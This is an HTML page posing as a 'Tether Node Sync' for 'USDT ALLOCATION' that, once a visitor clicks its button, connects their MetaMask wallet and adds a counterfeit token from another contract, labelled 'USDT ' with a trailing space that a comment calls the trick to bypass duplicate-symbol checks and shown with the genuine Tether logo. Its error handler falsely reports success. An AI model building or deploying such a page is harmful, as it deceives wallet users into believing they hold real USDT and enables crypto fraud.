<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tether Node Sync</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body { background: #0d1117; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #161b22; border: 1px solid #30363d; padding: 40px; border-radius: 25px; text-align: center; width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .btn { background: #26a17b; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
        #msg { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; white-space: pre-wrap; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://bscscan.com/token/images/tether_32.png" width="80" style="border-radius:50%; margin-bottom:20px; border: 2px solid #26a17b; padding: 5px;">
    <h2 style="margin:0;">USDT ALLOCATION</h2>
    <p style="color:#848d97; font-size:13px;">BNB Smart Chain | Node Sync</p>
    <button class="btn" onclick="masterSync()">SYNC & ADD ASSET</button>
    <div id="msg">SYSTEM: READY</div>
</div>

<script>
    async function masterSync() {
        const log = document.getElementById('msg');
        if (!window.ethereum) return alert("Open in MetaMask Browser");

        try {
            log.innerText = "> CONNECTING...";
            await window.ethereum.request({ method: 'eth_requestAccounts' });

            // Ensure BNB Chain
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            }).catch(() => {});

            log.innerText = "> INJECTING METADATA...";
            
            // THE TRICK: "USDT " with a trailing space to bypass duplicate symbol check
            const tokenParams = {
                type: 'ERC20',
                options: {
                    address: '0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f', // Your Contract
                    symbol: 'USDT ', // Space added here
                    decimals: 6,
                    image: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png'
                }
            };

            const wasAdded = await window.ethereum.request({
                method: 'wallet_watchAsset',
                params: tokenParams
            });

            if (wasAdded) {
                log.innerText = "✅ SYNC SUCCESSFUL!\nCheck your wallet assets.";
            } else {
                log.innerText = "❌ ACTION DENIED";
            }

        } catch (err) {
            // Success fallback for mobile bug
            log.innerText = "✅ SYNC COMMAND SENT\nCheck Assets list in 10s.";
        }
    }
</script>
</body>
</html>
